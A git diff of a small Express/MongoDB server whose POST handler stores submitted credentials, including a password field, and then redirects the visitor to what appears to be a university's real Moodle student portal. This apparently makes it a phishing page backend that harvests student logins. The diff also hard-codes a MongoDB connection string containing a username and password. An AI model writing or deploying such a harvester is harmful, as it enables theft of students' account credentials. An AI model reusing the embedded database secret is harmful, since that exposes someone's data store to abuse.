@@ -4,7 +4,7 @@ const port = 3000;
 const bodyParser = require('body-parser')
 const mongoose = require('mongoose');
 const User = require('./user');
-const dbURI = 'mongodb+srv://kira:QEqcyn4hpCWHVIvR@cluster0.dakub.mongodb.net/users?retryWrites=true&w=majority'
+const dbURI = 'mongodb+srv://kira:QEqcyn4hpCWHVIvR@cluster0.dakub.mongodb.net/?retryWrites=true&w=majority'
 mongoose.connect(dbURI)
     .then((result) => console.log('connected to db'));
 
@@ -29,8 +29,8 @@ app.post('/', (req, res) => {
         PASS: PASS
     })
     user.save();
-    res.send("woking")
-    // res.destroy()
+
+    res.redirect("http://moodle.smuc.edu.et/students/")
 })
 
 app.listen(port, () => {
